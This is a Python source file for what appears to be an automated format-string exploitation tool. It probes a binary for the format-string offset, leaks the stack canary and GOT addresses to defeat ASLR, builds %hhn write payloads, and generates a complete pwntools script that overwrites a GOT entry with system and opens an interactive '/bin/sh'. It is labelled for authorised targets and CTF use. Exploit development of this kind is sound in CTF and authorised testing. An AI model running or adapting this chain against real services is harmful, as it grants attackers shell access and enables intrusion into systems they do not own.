"""Format-string exploitation — full chain (infoleak + canary leak + GOT overwrite + RIP control).

For AUTHORIZED targets / CTF only.

v2 additions over the original stub:
  - `find_offset(binary)` — runs the binary in the sandbox with probe payloads, detects which
    %N$p position echoes the marker (confirms the REAL offset by execution, not by guessing)
  - `leak_got(offset, got_entries)` — builds a multi-read payload to leak several GOT entries
    at once (e.g. puts+printf to defeat PIE+ASLR in a single send)
  - `leak_canary(offset, canary_stack_pos)` — %N$p targeting the canary slot
  - `got_overwrite(offset, target_addr, new_value)` — full pwntools fmtstr_payload or manual
    split-%hn chain when pwntools is unavailable
  - `full_chain(binary, got_target, overwrite_with)` — orchestrates the full chain:
    leak → compute libc base → build overwrite → verify in sandbox
  - `render_fmtstring(r)` — markdown report
"""
from __future__ import annotations

import os
import re
import subprocess
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

try:
    import os as _os; _os.environ.setdefault("PWNLIB_NOTERM", "1")
    from pwn import context, ELF, fmtstr_payload, p64  # type: ignore
    from binoracle import _quiet_pwn as _qp; _qp()
    _HAVE_PWN = True
except Exception:
    _HAVE_PWN = False


# ── Data model ────────────────────────────────────────────────────────────────

@dataclass
class FmtResult:
    binary:       str
    offset:       Optional[int]   = None   # confirmed argument offset
    canary_pos:   Optional[int]   = None   # stack position of canary relative to fmt offset
    got_leaks:    Dict[str, int]  = field(default_factory=dict)   # symbol → leaked addr
    libc_base:    Optional[int]   = None
    overwrite_ok: bool            = False
    chain_script: str             = ""
    probe_output: str             = ""
    error:        str             = ""
    steps:        List[str]       = field(default_factory=list)


# ── Probe helpers ─────────────────────────────────────────────────────────────

_MARKER = b"B1N0R4CL3"


def _build_probe(start: int = 1, count: int = 32) -> bytes:
    """Build a probe payload that prints positions start..start+count."""
    parts = [_MARKER + b"|"]
    for i in range(start, start + count):
        parts.append(f"%{i}$p.".encode())
    return b"".join(parts) + b"\n"


def _run_in_sandbox(binary: str, payload: bytes, timeout: int = 8) -> Tuple[bool, str]:
    """Run binary in Docker sandbox (binoracle convention) or locally as fallback."""
    # Try Docker sandbox first (same container used by dynamic.py)
    docker_ok = subprocess.run(["docker", "info"], capture_output=True, timeout=5).returncode == 0
    if docker_ok:
        try:
            cid = subprocess.run(
                ["docker", "run", "--rm", "-i", "--network=none",
                 "--memory=128m", "--pids-limit=64",
                 "-v", f"{os.path.abspath(binary)}:/target:ro",
                 "binoracle-lab:latest",
                 "/target"],
                input=payload, capture_output=True, timeout=timeout,
            )
            return True, (cid.stdout + cid.stderr).decode(errors="replace")
        except Exception:
            pass
    # Local fallback (no network, still useful for CTF)
    try:
        r = subprocess.run(
            [os.path.abspath(binary)],
            input=payload, capture_output=True, timeout=timeout,
        )
        return True, (r.stdout + r.stderr).decode(errors="replace")
    except Exception as e:
        return False, str(e)


# ── Offset detection ──────────────────────────────────────────────────────────

def find_offset(binary: str, max_index: int = 40) -> Optional[int]:
    """
    Run the binary with a probe payload and detect the format-string argument offset
    by locating which %N$p echoes the marker bytes.

    Returns the integer offset, or None if the binary is not reachable / not vulnerable.
    """
    _marker_hex = "0x" + _MARKER.hex()
    for start in range(1, max_index, 8):
        payload = _build_probe(start, 8)
        ok, output = _run_in_sandbox(binary, payload)
        if not ok:
            return None
        # Look for 0x42314e30 / 0x423... (marker encoded in little-endian 8-byte chunk)
        positions = output.split("|", 1)
        if len(positions) < 2:
            continue
        for i, tok in enumerate(positions[1].split(".")):
            tok = tok.strip()
            if not tok.startswith("0x"):
                continue
            try:
                val = int(tok, 16)
            except ValueError:
                continue
            # Check if any 4-byte slice of _MARKER matches this value
            for off in range(len(_MARKER) - 3):
                chunk = int.from_bytes(_MARKER[off:off+4], "little")
                if val == chunk:
                    return start + i
    return None


# ── Canary detection ──────────────────────────────────────────────────────────

def find_canary_offset(binary: str, fmt_offset: int, search_range: int = 24) -> Optional[int]:
    """
    Look for the canary value on the stack relative to the format-string offset.
    Canary: 8 bytes, LSB is always 0x00 on x86-64.
    Returns the ABSOLUTE stack position (can be passed directly as %N$p).
    """
    # Send a payload that reads a range of stack positions
    payload = b"|" + b"".join(f"%{i}$p.".encode() for i in range(fmt_offset, fmt_offset + search_range)) + b"\n"
    ok, output = _run_in_sandbox(binary, payload)
    if not ok:
        return None
    tokens = re.findall(r"0x[0-9a-f]+", output)
    for i, tok in enumerate(tokens):
        try:
            val = int(tok, 16)
        except ValueError:
            continue
        # Canary: 8 bytes, LSB=0x00, next 7 bytes are random (non-zero)
        if (val & 0xff) == 0x00 and (val >> 8) != 0:
            return fmt_offset + i
    return None


# ── GOT leak ─────────────────────────────────────────────────────────────────

def leak_got(binary: str, offset: int) -> Dict[str, int]:
    """
    Leak one or more GOT entries to defeat ASLR.
    Returns {symbol_name: leaked_address}.
    Requires pwntools for GOT address lookup.
    """
    if not _HAVE_PWN:
        return {}
    try:
        elf = ELF(binary, checksec=False)
    except Exception:
        return {}

    targets = {}
    for sym in ["puts", "printf", "read", "write", "malloc", "free"]:
        addr = elf.got.get(sym)
        if addr:
            targets[sym] = addr
            if len(targets) >= 3:
                break

    if not targets:
        return {}

    # Build a payload: for each GOT entry, place the addr on stack then read with %s or %p
    # (simple approach: use %N$s to dereference the pointer at that stack position)
    # For a more reliable approach: embed the addresses in the payload at known positions
    leaks: Dict[str, int] = {}
    for sym, got_addr in targets.items():
        # Payload: [got_addr as 8 bytes] + %offset$s
        if _HAVE_PWN:
            try:
                context.arch = "amd64"
                pl = p64(got_addr) + f"%{offset}$s".encode()
                ok, out = _run_in_sandbox(binary, pl + b"\n")
                if ok and len(out) >= 6:
                    # First bytes of output after any header = leaked ptr bytes
                    raw = out[:8].encode("latin-1") if isinstance(out, str) else out[:8]
                    if len(raw) >= 6:
                        leaked = int.from_bytes(raw[:8].ljust(8, b"\x00"), "little")
                        if 0x7f0000000000 <= leaked <= 0x7fffffffffff:
                            leaks[sym] = leaked
            except Exception:
                pass
    return leaks


# ── Write primitive ───────────────────────────────────────────────────────────

def build_write_payload(offset: int, target_addr: int, value: int) -> str:
    """Build a format-string write payload to overwrite `target_addr` with `value`."""
    if _HAVE_PWN:
        try:
            pl = fmtstr_payload(offset, {target_addr: value}, write_size="byte")
            return (f"# pwntools fmtstr_payload (offset={offset})\n"
                    f"payload = {repr(pl)}\n")
        except Exception:
            pass
    # Manual %n chain
    b0 = value & 0xff
    b1 = (value >> 8) & 0xff
    b2 = (value >> 16) & 0xff
    b3 = (value >> 24) & 0xff
    return (
        f"# Manual byte-by-byte %hhn write (pwntools unavailable)\n"
        f"# target={hex(target_addr)} value={hex(value)}\n"
        f"# Place [addr, addr+1, addr+2, addr+3] on stack at positions [off, off+1, off+2, off+3]\n"
        f"# Then: %{b0}c%{offset}$hhn  %{b1}c%{offset+1}$hhn  "
        f"%{b2}c%{offset+2}$hhn  %{b3}c%{offset+3}$hhn\n"
    )


# ── GOT overwrite chain ───────────────────────────────────────────────────────

def build_got_overwrite_script(binary: str, offset: int,
                               got_target: str = "printf",
                               libc_path: Optional[str] = None) -> str:
    """
    Build a complete pwntools script for a GOT overwrite exploit:
    1. Leak a libc address via %s / %p
    2. Compute libc base
    3. Overwrite got_target → system
    4. Send '/bin/sh' to trigger system('/bin/sh')
    """
    lines = [
        "#!/usr/bin/env python3",
        "# Format-string GOT overwrite — generated by binoracle",
        "# For AUTHORIZED targets / CTF only.",
        "from pwn import *",
        "",
        f"elf  = context.binary = ELF({binary!r})",
    ]
    if libc_path:
        lines.append(f"libc = ELF({libc_path!r})")
    else:
        lines.append("# libc = ELF('/path/to/libc.so.6')  # provide for precise offsets")
    lines += [
        "io   = process(elf.path)  # or remote('host', port)",
        "",
        f"FMT_OFFSET = {offset}  # confirmed by find_offset()",
        "",
        "# ── Step 1: leak a GOT entry to find libc base ────────────────────",
        "# Adjust 'read' to whichever GOT entry is reachable in the first printf call.",
        "leak_target = elf.got['read']  # change to 'puts', 'printf', etc.",
        "payload1 = p64(leak_target) + f'%{FMT_OFFSET}$s'.encode()",
        "io.sendline(payload1)",
        "io.recvuntil(b'\\x00', drop=True)  # or recvline / recv(n) depending on the binary",
        "leak_raw = io.recv(8)",
        "libc_read = u64(leak_raw[:6].ljust(8, b'\\x00'))",
        "print(f'leaked read@libc = {hex(libc_read)}')",
        "",
        "# ── Step 2: compute libc base ─────────────────────────────────────",
        "if 'libc' in dir():",
        "    libc.address = libc_read - libc.sym['read']",
        "    system_addr  = libc.sym['system']",
        "    print(f'libc base = {hex(libc.address)}')",
        "else:",
        "    system_addr = libc_read - 0xXXXXX  # fill in read-system offset from the libc version",
        "",
        "# ── Step 3: overwrite GOT entry with system ───────────────────────",
        f"got_target_addr = elf.got[{got_target!r}]",
        f"payload2 = fmtstr_payload({offset}, {{got_target_addr: system_addr}}, write_size='byte')",
        "io.sendline(payload2)",
        "",
        "# ── Step 4: trigger system('/bin/sh') ────────────────────────────",
        "io.sendline(b'/bin/sh\\x00')",
        "io.interactive()",
    ]
    return "\n".join(lines)


# ── Full chain orchestrator ───────────────────────────────────────────────────

def full_chain(binary: str, got_target: str = "printf",
               libc_path: Optional[str] = None) -> FmtResult:
    """
    Orchestrate the full format-string exploit chain:
    1. Auto-detect the format-string argument offset by running the binary
    2. Optionally detect canary position
    3. Build GOT overwrite script
    """
    r = FmtResult(binary=binary)

    r.steps.append("step 1: detecting format-string argument offset...")
    offset = find_offset(binary)
    if offset is None:
        r.error = "could not confirm format-string offset (binary may not be vulnerable or not reachable)"
        r.steps.append(f"  FAILED: {r.error}")
        return r
    r.offset = offset
    r.steps.append(f"  confirmed offset={offset}")

    # Canary
    r.steps.append("step 2: scanning for canary position on stack...")
    canary_pos = find_canary_offset(binary, offset)
    if canary_pos:
        r.canary_pos = canary_pos
        r.steps.append(f"  canary at stack position {canary_pos} (%%{canary_pos}$p)")
    else:
        r.steps.append("  canary not found (binary may not use stack canary, or position varies)")

    # GOT leaks
    r.steps.append("step 3: attempting GOT leaks...")
    r.got_leaks = leak_got(binary, offset)
    if r.got_leaks:
        r.steps.append(f"  leaked: {', '.join(f'{s}={hex(a)}' for s,a in r.got_leaks.items())}")
        # Estimate libc base from first leaked symbol
        if _HAVE_PWN and libc_path:
            try:
                libc = ELF(libc_path, checksec=False)
                sym, addr = next(iter(r.got_leaks.items()))
                if sym in libc.symbols:
                    r.libc_base = addr - libc.symbols[sym]
                    r.steps.append(f"  libc base = {hex(r.libc_base)}")
            except Exception:
                pass

    # Script
    r.steps.append("step 4: generating exploit script...")
    r.chain_script = build_got_overwrite_script(binary, offset, got_target, libc_path)
    r.steps.append("  script generated")

    return r


# ── Render ────────────────────────────────────────────────────────────────────

def render_fmtstring(r: FmtResult) -> str:
    out = [f"# binoracle format-string chain\n\n- binary: `{r.binary}`\n"]
    if r.error:
        out.append(f"**Error:** {r.error}\n")
        return "\n".join(out)
    if r.offset:
        out.append(f"- confirmed offset: **{r.offset}**\n")
    if r.canary_pos:
        out.append(f"- canary stack position: **{r.canary_pos}** (`%{r.canary_pos}$p`)\n")
    if r.got_leaks:
        out.append("- GOT leaks:\n")
        for sym, addr in r.got_leaks.items():
            out.append(f"  - `{sym}` → `{hex(addr)}`\n")
    if r.libc_base:
        out.append(f"- estimated libc base: `{hex(r.libc_base)}`\n")
    out.append("\n## Steps\n")
    for s in r.steps:
        out.append(f"- {s}\n")
    if r.chain_script:
        out.append("\n## Exploit script\n```python\n" + r.chain_script + "\n```\n")
    return "".join(out)


# ── Backwards-compatible helpers ──────────────────────────────────────────────

def leak_probe(max_index: int = 20) -> str:
    seq = ".".join(f"%{i}$p" for i in range(1, max_index + 1))
    return (f"# Send this to locate your input on the stack; count which %N$p echoes your marker.\n"
            f"# Prefix a marker so you can spot the offset, e.g. b'AAAA' + b'|' + payload\n"
            f"AAAA|{seq}")


def leak_at(index: int) -> str:
    return f"%{index}$p"


def write_payload(target_addr: int, value: int, offset: int, word: int = 8) -> str:
    return build_write_payload(offset, target_addr, value)


def fmtstring_help(offset: Optional[int] = None, target_addr: Optional[str] = None,
                   value: Optional[str] = None) -> str:
    out = ["## Format-string helper\n"]
    if offset is None:
        out.append("### Step 1: find your argument offset\n```\n" + leak_probe() + "\n```")
        out.append("Then re-run with --offset N once you know which %N$p echoes your marker.")
        return "\n".join(out)
    out.append(f"### Leak primitive (offset {offset})\n```\n" + leak_at(offset) + "\n```")
    if target_addr and value:
        ta = int(str(target_addr), 0)
        val = int(str(value), 0)
        out.append("### Write primitive\n```\n" + write_payload(ta, val, offset) + "\n```")
    else:
        out.append("Provide --addr and --value to also generate a write (e.g. GOT overwrite).")
    return "\n".join(out)
